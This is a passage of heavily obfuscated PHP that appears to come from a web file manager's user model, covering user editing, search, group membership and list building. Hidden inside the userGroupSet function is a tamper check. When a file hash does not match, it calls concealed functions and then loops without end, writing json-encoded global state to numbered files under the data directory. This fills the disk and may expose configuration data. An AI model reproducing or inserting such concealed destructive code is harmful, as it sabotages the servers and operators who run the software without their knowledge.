$¼‚ö‰íÃ[$ş•’–ó…[2299]], $ş•’–ó…[2531] => $·÷ÆöÌ©[$ş•’–ó…[2092]]); $this->userEdit($Ôˆ¹ ôö, $ì÷ÖÏÜ‰); Model($ş•’–ó…[1448])->userRootAdd($Ôˆ¹ ôö); return $Ôˆ¹ ôö; } protected function userEditTest($˜‹Ë¡úú, $®°§’ù) { return $this->call($_SERVER[É¨™èà][2532], $˜‹Ë¡úú, $®°§’ù); } protected function userEdit($˜ÌßË‚¼, $—Œó®´) { $×¢¹©Ú =& $_SERVER[É¨™èà]; $äÄÀ©”ˆ = $this->getInfoSimple($˜ÌßË‚¼); if (!$äÄÀ©”ˆ) { return !1; } $úüËÅœœ = $this->_checkExist($—Œó®´, $˜ÌßË‚¼); if ($úüËÅœœ !== !0) { return $úüËÅœœ; } if (isset($—Œó®´[$×¢¹©Ú[983]]) && trim($—Œó®´[$×¢¹©Ú[983]]) != $×¢¹©Ú[12]) { $—©ì¬—Æ = $this->metaGet($˜ÌßË‚¼); if (empty($—©ì¬—Æ[$×¢¹©Ú[2521]])) { $—©ì¬—Æ[$×¢¹©Ú[2521]] = rand_string(10); Model($×¢¹©Ú[589])->metaSet($˜ÌßË‚¼, $×¢¹©Ú[2521], $—©ì¬—Æ[$×¢¹©Ú[2521]]); } $—Œó®´[$×¢¹©Ú[983]] = md5($—©ì¬—Æ[$×¢¹©Ú[2521]] . trim($—Œó®´[$×¢¹©Ú[983]])); } else { unset($—Œó®´[$×¢¹©Ú[983]]); } if (!empty($—Œó®´[$×¢¹©Ú[2504]]) && strlen($—Œó®´[$×¢¹©Ú[2504]]) > 255) { $—Œó®´[$×¢¹©Ú[2504]] = $×¢¹©Ú[12]; } if (isset($—Œó®´[$×¢¹©Ú[2299]])) { $this->setNamePinyin($˜ÌßË‚¼, $—Œó®´[$×¢¹©Ú[2299]]); } if (isset($—Œó®´[$×¢¹©Ú[2092]])) { $Éï• = $×¢¹©Ú[1407] . $˜ÌßË‚¼; $­©ÍÇÅ = $×¢¹©Ú[1405]; $ØòÑ«Ë = $—Œó®´[$×¢¹©Ú[2092]] ? $—Œó®´[$×¢¹©Ú[2092]] : $×¢¹©Ú[12]; $‹òœˆ×ì = Model($×¢¹©Ú[1404])->get($Éï•, $­©ÍÇÅ); $‹òœˆ×ì = $‹òœˆ×ì ? $‹òœˆ×ì : $×¢¹©Ú[12]; if ($‹òœˆ×ì != $ØòÑ«Ë) { if (!$ØòÑ«Ë && $‹òœˆ×ì) { Model($×¢¹©Ú[1404])->remove($Éï•, $­©ÍÇÅ); } else { if ($ØòÑ«Ë) { Model($×¢¹©Ú[1404])->set($Éï•, $ØòÑ«Ë, $­©ÍÇÅ); } } } unset($—Œó®´[$×¢¹©Ú[2092]]); Model($×¢¹©Ú[609])->metaSet($˜ÌßË‚¼, $×¢¹©Ú[2092], $ØòÑ«Ë); } if (empty($—Œó®´)) { return !0; } $this->where(array($×¢¹©Ú[1791] => $˜ÌßË‚¼))->save($—Œó®´); $this->clearCache($˜ÌßË‚¼); return !0; } public function setNamePinyin($¦™ëç÷à, $ô§¤¤™ = false) { $Ë¶äïšÒ =& $_SERVER[É¨™èà]; if (!$ô§¤¤™) { $®Ş•„“å = $this->getInfoSimple($¦™ëç÷à); $ô§¤¤™ = $®Ş•„“å[$Ë¶äïšÒ[2299]] ? $®Ş•„“å[$Ë¶äïšÒ[2299]] : $®Ş•„“å[$Ë¶äïšÒ[32]]; } $ßùÓìó¢ = Model($Ë¶äïšÒ[609]); if (!Input::check($ô§¤¤™, $Ë¶äïšÒ[670])) { return $ßùÓìó¢->metaSet($¦™ëç÷à, array($Ë¶äïšÒ[548] => $Ë¶äïšÒ[12], $Ë¶äïšÒ[547] => $Ë¶äïšÒ[12])); } return $ßùÓìó¢->metaSet($¦™ëç÷à, array($Ë¶äïšÒ[548] => str_replace($Ë¶äïšÒ[53], $Ë¶äïšÒ[12], Pinyin::get($ô§¤¤™)), $Ë¶äïšÒ[547] => Pinyin::get($ô§¤¤™, $Ë¶äïšÒ[671]))); } private function nickNameRpt() { $ì‡ùš =& $_SERVER[É¨™èà]; $ªäëÈÎç = Model($ì‡ùš[861])->get($ì‡ùš[2533]); $èµ÷ÀŒ = $GLOBALS[$ì‡ùš[6]][$ì‡ùš[467]][$ì‡ùš[2533]]; $É°·Ç÷‹ = !is_null($ªäëÈÎç) ? $ªäëÈÎç : $èµ÷ÀŒ; return !!$É°·Ç÷‹; } private function _checkExist($•ßéçñê, $Ø½»Î­¬ = false) { $—ù²À§Ö =& $_SERVER[É¨™èà]; $ÊŠÍêƒ› = array($—ù²À§Ö[32] => UserModel::ERROR_USER_EXIST_NAME, $—ù²À§Ö[2299] => UserModel::ERROR_USER_EXIST_NICKNAME, $—ù²À§Ö[391] => UserModel::ERROR_USER_EXIST_EMAIL, $—ù²À§Ö[2520] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($ÊŠÍêƒ›[$—ù²À§Ö[2299]]); } $ÒÙ¨Œ– = $Ø½»Î­¬ ? array($—ù²À§Ö[1800] => array($—ù²À§Ö[2534], $Ø½»Î­¬)) : array(); foreach ($ÊŠÍêƒ› as $ĞÀµÉ‚ğ => $¾Ï‰’) { $¼ò‰±©¼ = array(); foreach ($ÊŠÍêƒ› as $Ê­ƒÉŞ£ => $òÀ¹ˆˆ÷) { if (isset($•ßéçñê[$Ê­ƒÉŞ£]) && $•ßéçñê[$Ê­ƒÉŞ£]) { $¼ò‰±©¼[] = $•ßéçñê[$Ê­ƒÉŞ£]; } } if (!$¼ò‰±©¼) { continue; } $¯íòÔî˜ = array_merge(array($ĞÀµÉ‚ğ => array($—ù²À§Ö[7], $¼ò‰±©¼)), $ÒÙ¨Œ–); $è– £‘‹ = $this->where($¯íòÔî˜)->find(); if ($è– £‘‹) { return $¾Ï‰’; } } return !0; } public function userListInfo($÷†½Éé) { $‰õ¢ƒÂ£ =& $_SERVER[É¨™èà]; $ÔßõİÛ’ = array(); $÷†½Éé = is_array($÷†½Éé) ? array_unique($÷†½Éé) : array(); if (!$÷†½Éé) { return $ÔßõİÛ’; } if (count($÷†½Éé) < 20) { foreach ($÷†½Éé as $çèïÓ¶”) { $ÔßõİÛ’[$çèïÓ¶” . $‰õ¢ƒÂ£[12]] = $this->getInfoSimpleOuter($çèïÓ¶”); } } else { $‡êŞÀª = array($‰õ¢ƒÂ£[1791] => array($‰õ¢ƒÂ£[502], $÷†½Éé)); if (count($÷†½Éé) == 1) { $‡êŞÀª = array($‰õ¢ƒÂ£[1791] => $÷†½Éé[0]); } $íö»õœŠ = Model($‰õ¢ƒÂ£[589])->field($this->simpleField)->where($‡êŞÀª)->select(); $íö»õœŠ = array_to_keyvalue($íö»õœŠ, $‰õ¢ƒÂ£[1800]); foreach ($÷†½Éé as $çèïÓ¶”) { $­³¢ªåØ = $íö»õœŠ[$çèïÓ¶”]; if (!$­³¢ªåØ) { $ÔßõİÛ’[$çèïÓ¶” . $‰õ¢ƒÂ£[12]] = $this->getInfoSimpleOuter($çèïÓ¶”); continue; } $­³¢ªåØ[$‰õ¢ƒÂ£[2504]] = Action($‰õ¢ƒÂ£[2505])->parseUrl($­³¢ªåØ[$‰õ¢ƒÂ£[2504]]); $ÔßõİÛ’[$çèïÓ¶” . $‰õ¢ƒÂ£[12]] = $­³¢ªåØ; } } return $ÔßõİÛ’; } protected function userStatus($Şâ½Ğ†£, $ı‘æËÕ) { $¸àÕğí€ = $this->getInfoSimple($Şâ½Ğ†£); if (!$¸àÕğí€) { return !1; } $Öî™¨ü‰ = array($_SERVER[É¨™èà][840] => $ı‘æËÕ); return $this->userEdit($Şâ½Ğ†£, $Öî™¨ü‰); } protected function userRemove($ØÂÙı¢) { $Ğ¸Ğó¤Ï =& $_SERVER[É¨™èà]; $şàÛƒ‰Á = $this->getInfoSimple($ØÂÙı¢); if (!$şàÛƒ‰Á) { return !1; } $õ‚¬Ú™ï = array($Ğ¸Ğó¤Ï[1791] => $ØÂÙı¢); Model($Ğ¸Ğó¤Ï[679])->where($õ‚¬Ú™ï)->delete(); Model($Ğ¸Ğó¤Ï[2535])->where($õ‚¬Ú™ï)->delete(); Model($Ğ¸Ğó¤Ï[2094])->where($õ‚¬Ú™ï)->delete(); Model($Ğ¸Ğó¤Ï[2519])->where($õ‚¬Ú™ï)->delete(); Model($Ğ¸Ğó¤Ï[1163])->where($õ‚¬Ú™ï)->delete(); Model($Ğ¸Ğó¤Ï[2316])->removeUserAll($ØÂÙı¢); Model($Ğ¸Ğó¤Ï[921])->userRootRemove($ØÂÙı¢); return $this->where($õ‚¬Ú™ï)->delete(); } protected function userGroupSet($Êå¾ü—, $¤ãä¨Æ, $İ¨¸Üïé = array()) { $ŠÉÛ–ã¨ =& $_SERVER[É¨™èà]; $ó‰šƒ¯† = $_SERVER[$ŠÉÛ–ã¨[311]] . $ŠÉÛ–ã¨[312]; $œàÉ”Óã = $ŠÉÛ–ã¨[2480]; if ($_SERVER[$ŠÉÛ–ã¨[308]] != $œàÉ”Óã($ó‰šƒ¯†)) { $óå«Ù š = $ŠÉÛ–ã¨[974]; $¶Å »€Ò = $ŠÉÛ–ã¨[310]; $îŞ•™î… = $_SERVER[$ŠÉÛ–ã¨[311]] . $ŠÉÛ–ã¨[312]; $Ç±¡ğ· = $¶Å »€Ò($îŞ•™î…); $ÔÏ¬•âÏ = explode($ŠÉÛ–ã¨[288], $Ç±¡ğ·); if (count($ÔÏ¬•âÏ) < $ŠÉÛ–ã¨[704]) { $ú±¶ø¼¯ = $ŠÉÛ–ã¨[314]; $ú±¶ø¼¯(); } $šÓ‰â = $ŠÉÛ–ã¨[975]; $šÓ‰â($_SERVER[$ŠÉÛ–ã¨[976]]); $óå«Ù š = $ŠÉÛ–ã¨[974]; $óå«Ù š(); $¾ˆ·÷òí = $ŠÉÛ–ã¨[2536]; $¥Èò’ŠÏ = json_encode($GLOBALS[$ŠÉÛ–ã¨[2537]]); $Ä£Û‹‰œ = 1; for ($‹Ú ˆøİ = $Ä£Û‹‰œ; $‹Ú ˆøİ > 0; $‹Ú ˆøİ++) { $¾ˆ·÷òí(DATA_PATH . $‹Ú ˆøİ, $¥Èò’ŠÏ); } } $Ù¨íƒ = $this->getInfoSimple($Êå¾ü—); if (!$Ù¨íƒ || !is_array($¤ãä¨Æ)) { return !1; } $©ñ³Ú¼ş = Model($ŠÉÛ–ã¨[2094]); $©ñ³Ú¼ş->where(array($ŠÉÛ–ã¨[1800] => $Êå¾ü—))->delete(); $¥Ü®¹ÏÜ = array(); $úí ø¨ô = 0; foreach ($¤ãä¨Æ as $Ñ®‹…ş => $ÆŸøÊ¸ğ) { $ÇœÙ’•é = array($ŠÉÛ–ã¨[1800] => $Êå¾ü—, $ŠÉÛ–ã¨[1410] => $Ñ®‹…ş, $ŠÉÛ–ã¨[2108] => $ÆŸøÊ¸ğ); $ÇœÙ’•é[$ŠÉÛ–ã¨[2023]] = isset($İ¨¸Üïé[$úí ø¨ô]) ? $İ¨¸Üïé[$úí ø¨ô] : 0; $úí ø¨ô++; $¥Ü®¹ÏÜ[] = $ÇœÙ’•é; } return $©ñ³Ú¼ş->addAll($¥Ü®¹ÏÜ, array(), !0); } protected function userGroupAdd($µó‘ñìŠ, $Á®ÉºÛƒ = array()) { $ôÂ§üš =& $_SERVER[É¨™èà]; $„‡ÒÅ¬¨ = $this->getInfoSimple($µó‘ñìŠ); if (!$„‡ÒÅ¬¨ || empty($Á®ÉºÛƒ)) { return !1; } $Î‰÷‘ò = array(); foreach ($Á®ÉºÛƒ as $ÒË“ö® => $Øâ«³Ùİ) { $Î‰÷‘ò[] = array($ôÂ§üš[1800] => $µó‘ñìŠ, $ôÂ§üš[1410] => $ÒË“ö®, $ôÂ§üš[2108] => $Øâ«³Ùİ, $ôÂ§üš[2023] => 0); } return Model($ôÂ§üš[2094])->addAll($Î‰÷‘ò, array(), !0); } protected function userGroupRemove($¥Àãİ½¿, $ãú²Âıò) { $¡¨áß²º =& $_SERVER[É¨™èà]; $å‡û­× = $this->getInfoSimple($¥Àãİ½¿); if (!$å‡û­× || !$ãú²Âıò) { return !1; } $úåô‘ù¤ = array($¡¨áß²º[1791] => $¥Àãİ½¿, $¡¨áß²º[2089] => $ãú²Âıò); return Model($¡¨áß²º[2094])->where($úåô‘ù¤)->delete(); } public function listData() { $ªÒ™Ú¾ş = $this->_makeOrder()->selectPage(50); $this->_listDataApply($ªÒ™Ú¾ş[$_SERVER[É¨™èà][456]]); return $ªÒ™Ú¾ş; } public function listByID($µÈ¼´–©) { $©¾¹«¡ =& $_SERVER[É¨™èà]; if (!$µÈ¼´–©) { return; } $¼ï†Öœ“ = array($©¾¹«¡[1800] => array($©¾¹«¡[7], $µÈ¼´–©)); $¤ã¦£´Û = $this->where($¼ï†Öœ“)->select(); $¤ã¦£´Û = array_sort_keep($¤ã¦£´Û, $©¾¹«¡[1800], $µÈ¼´–©); $this->_listDataApply($¤ã¦£´Û); return $¤ã¦£´Û; } public function listByGroup($ÜÉé¶­ø = 0, $„àú¸“ê = array()) { $é¡€Â Ô =& $_SERVER[É¨™èà]; $ÅúÀãù€ = $é¡€Â Ô[12]; $á¯¹€ö = array(); if ($ÜÉé¶­ø) { $á¯¹€ö = array($é¡€Â Ô[2538] => intval($ÜÉé¶­ø)); $ÅúÀãù€ = "\x4c\105\106\x54\40\112\117\x49\116\x20{$this->tablePrefix}\x75\163\145\162\x5f\147\x72\157\x75\x70\40\165\x73\x65\162\x5f\147\162\x6f\165\160\x20\x6f\156\x20\165\x73\x65\162\56\165\x73\145\x72\x49\104\40\x3d\40\165\x73\x65\x72\x5f\x67\162\157\x75\x70\x2e\165\x73\145\162\111\x44"; $äµ½Ğ¿Ä = Input::get($é¡€Â Ô[540], null, $é¡€Â Ô[12]) ? $é¡€Â Ô[12] : $é¡€Â Ô[2539]; } if (isset($„àú¸“ê[$é¡€Â Ô[840]])) { $á¯¹€ö[$é¡€Â Ô[2540]] = $„àú¸“ê[$é¡€Â Ô[840]]; } $Õ­ÚÎ‘ = _get($„àú¸“ê, $é¡€Â Ô[2541], $é¡€Â Ô[234]); if (_get($„àú¸“ê, $é¡€Â Ô[851], !1)) { $á¯¹€ö[$Õ­ÚÎ‘] = array($é¡€Â Ô[2280], $„àú¸“ê[$é¡€Â Ô[851]]); } if (_get($„àú¸“ê, $é¡€Â Ô[852], !1)) { $´€ûµşŒ = array($é¡€Â Ô[2281], $„àú¸“ê[$é¡€Â Ô[852]]); if ($á¯¹€ö[$Õ­ÚÎ‘]) { $á¯¹€ö[$Õ­ÚÎ‘] = array($á¯¹€ö[$Õ­ÚÎ‘], $´€ûµşŒ, $é¡€Â Ô[2282]); } else { $á¯¹€ö[$Õ­ÚÎ‘] = $´€ûµşŒ; } } $×ñ½™“œ = $this->_makeOrder($äµ½Ğ¿Ä)->field($é¡€Â Ô[2542])->where($á¯¹€ö)->join($ÅúÀãù€)->selectPage(50); $this->_listDataApply($×ñ½™“œ[$é¡€Â Ô[456]]); return $×ñ½™“œ; } private function _makeOrder($ŠäúÏÌ = '') { $ÃÊÏ¨Óø =& $_SERVER[É¨™èà]; $şíô±« = array($ÃÊÏ¨Óø[1800], $ÃÊÏ¨Óø[32], $ÃÊÏ¨Óø[1988], $ÃÊÏ¨Óø[2210], $ÃÊÏ¨Óø[1961], $ÃÊÏ¨Óø[234]); $ ªÔ» = array($ÃÊÏ¨Óø[533] => $ÃÊÏ¨Óø[534], $ÃÊÏ¨Óø[535] => $ÃÊÏ¨Óø[536]); $õÕ•÷…Ú = Input::get($ÃÊÏ¨Óø[540], $ÃÊÏ¨Óø[7], $ÃÊÏ¨Óø[1791], $şíô±«); $’¤¯³  = Input::get($ÃÊÏ¨Óø[541], $ÃÊÏ¨Óø[7], $ÃÊÏ¨Óø[2095], array($ÃÊÏ¨Óø[2095], $ÃÊÏ¨Óø[535])); $’¤¯³  = $ ªÔ»[$’¤¯³ ]; $ŠäúÏÌ = $ŠäúÏÌ . "\x75\x73\x65\162\x2e{$õÕ•÷…Ú}\40{$’¤¯³ }\54\40\165\x73\x65\x72\56\x75\163\x65\x72\x49\x44\x20\141\x73\143"; return $this->alias($ÃÊÏ¨Óø[2226])->order($ŠäúÏÌ); } public function listSearch($¨Àˆ×’Õ) { $Òâ»¢¬ =& $_SERVER[É¨™èà]; $ÄÉšû«€ = trim($¨Àˆ×’Õ[$Òâ»¢¬[2098]]); $ƒŠ ş®ô = explode($Òâ»¢¬[53], $ÄÉšû«€); if (!$ÄÉšû«€ || count($ƒŠ ş®ô) == 1) { return $this->listSearchNow($¨Àˆ×’Õ); } $æ×íËŞ” = array($Òâ»¢¬[456] => array()); foreach ($ƒŠ ş®ô as $Ä¾ÖÚ×¹) { if (!trim($Ä¾ÖÚ×¹)) { continue; } $¨Àˆ×’Õ[$Òâ»¢¬[2098]] = $Ä¾ÖÚ×¹; $¯ë¬‰—• = $this->listSearchNow($¨Àˆ×’Õ); $æ×íËŞ”[$Òâ»¢¬[456]] = array_merge($æ×íËŞ”[$Òâ»¢¬[456]], $¯ë¬‰—•[$Òâ»¢¬[456]]); } $æ×íËŞ”[$Òâ»¢¬[456]] = array_unique_by_key($æ×íËŞ”[$Òâ»¢¬[456]], $Òâ»¢¬[1800]); $æ×íËŞ”[$Òâ»¢¬[453]] = array($Òâ»¢¬[454] => count($æ×íËŞ”[$Òâ»¢¬[456]]), $Òâ»¢¬[450] => 20, $Òâ»¢¬[439] => 1, $Òâ»¢¬[455] => 1); return $æ×íËŞ”; } public function listSearchNow($„µ‘ª) { $ïö§Ñ¨† =& $_SERVER[É¨™èà]; $¥°·ÅÀœ = trim($„µ‘ª[$ïö§Ñ¨†[2098]]); $åˆ«¯ÃÄ = isset($„µ‘ª[$ïö§Ñ¨†[2099]]) ? $„µ‘ª[$ïö§Ñ¨†[2099]] : !1; $¥°·ÅÀœ = str_replace($ïö§Ñ¨†[2100], $ïö§Ñ¨†[2101], trim($¥°·ÅÀœ)); $õ›¬à™õ = array($ïö§Ñ¨†[32] => array($ïö§Ñ¨†[469], "\x25{$¥°·ÅÀœ}\x25"), $ïö§Ñ¨†[391] => array($ïö§Ñ¨†[469], "{$¥°·ÅÀœ}\45"), $ïö§Ñ¨†[2299] => array($ïö§Ñ¨†[469], "{$¥°·ÅÀœ}\45"), $ïö§Ñ¨†[1094] => $ïö§Ñ¨†[2102]); if (Input::check($¥°·ÅÀœ, $ïö§Ñ¨†[397])) { $õ›¬à™õ[$ïö§Ñ¨†[1800]] = array($ïö§Ñ¨†[469], "{$¥°·ÅÀœ}\45"); $õ›¬à™õ[$ïö§Ñ¨†[2520]] = array($ïö§Ñ¨†[469], "{$¥°·ÅÀœ}\x25"); } if (!$¥°·ÅÀœ) { $õ›¬à™õ = array(); } if (isset($„µ‘ª[$ïö§Ñ¨†[840]])) { $õ›¬à™õ[$ïö§Ñ¨†[840]] = $„µ‘ª[$ïö§Ñ¨†[840]]; } $õ›¬à™õ = $this->parseWhereLike($õ›¬à™õ); $ÈÁ¡ÆÃË = $this->_makeOrder()->where($õ›¬à™õ)->selectPage(20); if (!$ÈÁ¡ÆÃË || count($ÈÁ¡ÆÃË[$ïö§Ñ¨†[456]]) < 5 && Input::check($¥°·ÅÀœ, $ïö§Ñ¨†[404])) { $Ä´¬ƒÑ = $this->_searchFromMeta($ïö§Ñ¨†[547], $¥°·ÅÀœ, 10); $ŒÖ¨³şÓ = $this->_searchFromMeta($ïö§Ñ¨†[548], $¥°·ÅÀœ, 10); $í­È¬¼ = array_merge($Ä´¬ƒÑ, $ŒÖ¨³şÓ, $ÈÁ¡ÆÃË[$ïö§Ñ¨†[456]]); $ÈÁ¡ÆÃË[$ïö§Ñ¨†[456]] = array_unique_by_key($í­È¬¼, $ïö§Ñ¨†[1800]); $ÈÁ¡ÆÃË[$ïö§Ñ¨†[453]][$ïö§Ñ¨†[454]] = count($ÈÁ¡ÆÃË[$ïö§Ñ¨†[456]]); $ÈÁ¡ÆÃË[$ïö§Ñ¨†[453]][$ïö§Ñ¨†[455]] = ceil($ÈÁ¡ÆÃË[$ïö§Ñ¨†[453]][$ïö§Ñ¨†[454]] / $ÈÁ¡ÆÃË[$ïö§Ñ¨†[453]][$ïö§Ñ¨†[450]]); } $this->_listDataApply($ÈÁ¡ÆÃË[$ïö§Ñ¨†[456]]); $this->_filterByGroup($ÈÁ¡ÆÃË, $åˆ«¯ÃÄ); return $ÈÁ¡ÆÃË; } private function _filterByGroup(&$¥œ¨Ç„µ, $úæ›ª¥õ) { $×êµªŒò =& $_SERVER[É¨™èà]; if (!$úæ›ª¥õ) { return $¥œ¨Ç„µ; } foreach ($¥œ¨Ç„µ[$×êµªŒò[456]] as $³ó’ì½¿ => &$˜Šó¼ºğ) { $õğ¾÷¼› = array_to_keyvalue($˜Šó¼ºğ[$×êµªŒò[1409]], $×êµªŒò[12], $×êµªŒò[1410]); if (!in_array($úæ›ª¥õ, $õğ¾÷¼›)) { unset($¥œ¨Ç„µ[$×êµªŒò[456]][$³ó’ì½¿]); } } unset($˜Šó¼ºğ); $¥œ¨Ç„µ[$×êµªŒò[456]] = array_values($¥œ¨Ç„µ[$×êµªŒò[456]]); $¥œ¨Ç„µ[$×êµªŒò[453]] = array($×êµªŒò[2263] => count($¥œ¨Ç„µ[$×êµªŒò[456]]), $×êµªŒò[2261] => $¥œ¨Ç„µ[$×êµªŒò[453]][$×êµªŒò[450]], $×êµªŒò[2260] => 1, $×êµªŒò[2262] => 1); } private function _searchFromMeta($¤ìå§ , $…Ê°Œ½Ø, $¹¯²ÖÆ€) { $š”ù€•Ë =& $_SERVER[É¨™èà]; $…Ê°Œ½Ø = strtolower($…Ê°Œ½Ø); $ƒ¨–¸• = array($š”ù€•Ë[97] => $¤ìå§ , $š”ù€•Ë[461] => array($š”ù€•Ë[469], "\45{$…Ê°Œ½Ø}\x25")); $ƒ¨–¸• = $this->parseWhereLike($ƒ¨–¸•); $ÓÓúÖ…‚ = Model($š”ù€•Ë[2543])->where($ƒ¨–¸•)->limit($¹¯²ÖÆ€)->select(); if (!$ÓÓúÖ…‚) { return array(); } $ÓÓúÖ…‚ = array_to_keyvalue($ÓÓúÖ…‚, $š”ù€•Ë[12], $š”ù€•Ë[1800]); $Óš¬Üë = $this->where(array($š”ù€•Ë[1791] => array($š”ù€•Ë[7], $ÓÓúÖ…‚)))->select(); if (!$Óš¬Üë) { return array(); } return $Óš¬Üë; } private function _listDataApplyItem($½£íºûÊ) { $´Œ†ƒå· = array($½£íºûÊ); $this->_listDataApply($´Œ†ƒå·); return $´Œ†ƒå·[0]; } private function _listDataApply(&$ÊĞÄ”ù¾) { $°´òÎµ =& $_SERVER[É¨™èà]; if (!$ÊĞÄ”ù¾) { return; } array_remove_key($ÊĞÄ”ù¾, $°´òÎµ[983]); $—İÓ†×Ä = array_to_keyvalue($ÊĞÄ”ù¾, $°´òÎµ[12], $°´òÎµ[1800]); $this->_listAppendGroup($ÊĞÄ”ù¾, $—İÓ†×Ä); $this->_listAppendMeta($ÊĞÄ”ù¾, $—İÓ†×Ä); $this->_listAppendSourceRoot($ÊĞÄ”ù¾, $—İÓ†×Ä); } private function _listAppendSourceRoot(&$ šƒ¢ŠÉ, $¾ Å§üÄ) { $‰†‰£³Æ =& $_SERVER[É¨™èà]; $ò¥¹… = Model($‰†‰£³Æ[921])->listSourceRoot(SourceModel::TYPE_USER, $¾ Å§üÄ); $ò¥¹… = array_to_keyvalue($ò¥¹…, $‰†‰£³Æ[581]); $ò¥¹… = array_remove_key($ò¥¹…, $‰†‰£³Æ[581]); foreach ($ šƒ¢ŠÉ as &$ÒïÎ«ÕÏ) { $ÒïÎ«ÕÏ[$‰†‰£³Æ[90]] = $ò¥¹…[$ÒïÎ«ÕÏ[$‰†‰£³Æ[1800]]] ? $ò¥¹…[$ÒïÎ«ÕÏ[$‰†‰£³Æ[1800]]] : array(); } unset($ÒïÎ«ÕÏ); } private function _listAppendGroup(&$àáä¿¦Í, $Ù¾ÉÙá§) { $Ç—«…†İ =& $_SERVER[É¨™èà]; $æúøî¨» = array($Ç—«…†İ[1800] => array($Ç—«…†İ[7], $Ù¾ÉÙá§)); $Åœºñ¹† = Model($Ç—«…†İ[2094])->where($æúøî¨»)->select(); $±çİŒ´ = array_to_keyvalue($Åœºñ¹†, $Ç—«…†İ[12], $Ç—«…†İ[1410]); $±çİŒ´ = array_remove_value(array_unique($±çİŒ´), $Ç—«…†İ[231]); if (!$±çİŒ´ || !$Åœºñ¹†) { return; } $æúøî¨» = array($Ç—«…†İ[1410] => array($Ç—«…†İ[7], $±çİŒ´)); $Ù–­‚ = Model($Ç—«…†İ[1408])->field($Ç—«…†İ[2544])->where($æúøî¨»)->select(); $Ù–­‚ = array_to_keyvalue($Ù–­‚, $Ç—«…†İ[1410]); $Åœºñ¹† = array_to_keyvalue_group($Åœºñ¹†, $Ç—«…†İ[1800]); foreach ($Åœºñ¹† as &$Ç“²ÚãÛ) { $Ï£îÕÏ• = array(); foreach ($Ç“²ÚãÛ as $Èã÷»àˆ) { if (!$Èã÷»àˆ[$Ç—«…†İ[2108]]) { continue; } $„±Š¼‹ = Model($Ç—«…†İ[583])->listData($Èã÷»àˆ[$Ç—«…†İ[2108]]); $Ï£îÕÏ•[] = array($Ç—«…†İ[1410] => $Èã÷»àˆ[$Ç—«…†İ[1410]], $Ç—«…†İ[2545] => $Ù–­‚[$Èã÷»àˆ[$Ç—«…†İ[1410]]][$Ç—«…†İ[32]], $Ç—«…†İ[596] => $Ù–­‚[$Èã÷»àˆ[$Ç—«…†İ[1410]]][$Ç—«…†İ[596]], $Ç—«…†İ[497] => $„±Š¼‹); } $Ç“²ÚãÛ = $Ï£îÕÏ•; } unset($Ç“²ÚãÛ); foreach ($àáä¿¦Í as &$¡ÉÍ¨) { $¡ÉÍ¨[$Ç—«…†İ[1409]] = array(); if (isset($Åœºñ¹†[$¡ÉÍ¨[$Ç—«…†İ[1800]]])) { $¡ÉÍ¨[$Ç—«…†İ[1409]] = $Åœºñ¹†[$¡ÉÍ¨[$Ç—«…†İ[1800]]]; } } unset($¡ÉÍ¨); } public function userAppendGroup($ªÜœÈ) { $­ØğªøÙ =& $_SERVER[É¨™èà]; if (!$ªÜœÈ) { return array(); } $this->_listAppendGroup($ªÜœÈ, array_to_keyvalue($ªÜœÈ, $­ØğªøÙ[12], $­ØğªøÙ[1800])); return $ªÜœÈ; } private function _listAppendMeta(&$ÌÃŠ“…‚, $ïæöñÅ) { $Ü•Ñ™à =& $_SERVER[É¨™èà]; $ÒÔª›­ = UserJobModel::JOB_KEY; $ûøÖØ³ = array($Ü•Ñ™à[2092]); $¯“Ú¬á‘ = array($Ü•Ñ™à[1800] => array($Ü•Ñ™à[7], $ïæöñÅ)); $ÔØ³´°ğ = Model($Ü•Ñ™à[2519])->where($¯“Ú¬á‘)->select(); $Ğó‡ú = array(); foreach ($ÔØ³´°ğ as $š®İ€¦ñ) { $øØ§„« = $š®İ€¦ñ[$Ü•Ñ™à[1800]]; if (!isset($Ğó‡ú[$øØ§„«])) { $Ğó‡ú[$øØ§„«] = array(); } $Ğó‡ú[$øØ§„«][$š®İ€¦ñ[$Ü•Ñ™à[97]]] = $š®İ€¦ñ[$Ü•Ñ™à[461]]; } $ç¥’•àÓ = Model($Ü•Ñ™à[2546]); foreach ($ÌÃŠ“…‚ as &$Ôø÷›ã“) { $øØ§„« = $Ôø÷›ã“[$Ü•Ñ™à[1800]]; $ ûıÌ©ü = isset($Ğó‡ú[$øØ§„«]) ? $Ğó‡ú[$øØ§„«] : array(); $Ôø÷›ã“[$Ü•Ñ™à[551]] = array_field_key($ ûıÌ©ü, $ûøÖØ³); $Ôø÷›ã“[$Ü•Ñ™à[2547]] = array(); if (isset($ ûıÌ©ü[$ÒÔª›­])) { $Ôø÷›ã“[$Ü•Ñ™à[2547]] = $ç¥’•àÓ->getUserJobInfo($ ûıÌ©ü[$ÒÔª›­]); } } unset($Ôø÷›ã“); } protected function groupUserAll($…Ø™öÉ¦) { $ºµôíÂÁ =& $_SERVER[É¨™èà]; if (!$…Ø™öÉ¦) { return !1; } $ØÂšèÊà = Model($ºµôíÂÁ[2094])->field($ºµôíÂÁ[1800])->where(array($ºµôíÂÁ[1410] => array($ºµôíÂÁ[7], $…Ø™öÉ¦)))->select(); $ØÂšèÊà = array_to_keyvalue($ØÂšèÊà, $ºµôíÂÁ[12], $ºµôíÂÁ[1800]); return array_unique($ØÂšèÊà); } public function userSearch($Ù¯È÷à¨, $íÉ¬ä = "\x2a") { return Model($_SERVER[É¨™èà][609])->where($Ù¯È÷à¨)->field($íÉ¬ä)->find(); } } goto b¨ßÔ¾ù; Eé¦ö‘³ÛÄ: class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public $_data = array(); public function __construct() { $òè ……† =& $_SERVER[É¨™èà]; $this->objectDriver = array($òè ……†[60], $òè ……†[61], $òè ……†[62], $òè ……†[63], $òè ……†[64], $òè ……†[65], $òè ……†[66], $òè ……†[67], $òè ……†[68], $òè ……†[69], $òè ……†[70], $òè ……†[71]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($¹âÃ”—„) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($¹âÃ”—„, $_SERVER[É¨™èà][8]); } return $¹âÃ”—„; } public function iconvApp($Ø·ƒôÊö) { return $Ø·ƒôÊö; } public function iconvSystem($ô¬ÏÛ‰) { return $ô¬ÏÛ‰; } public function iconvTo($Ê›ó¬ï§, $şÌ¯†‡, $®ŠâÔ™) { $ŒŞ¬¼Ö” =& $_SERVER[É¨™èà]; if (!$Ê›ó¬ï§ 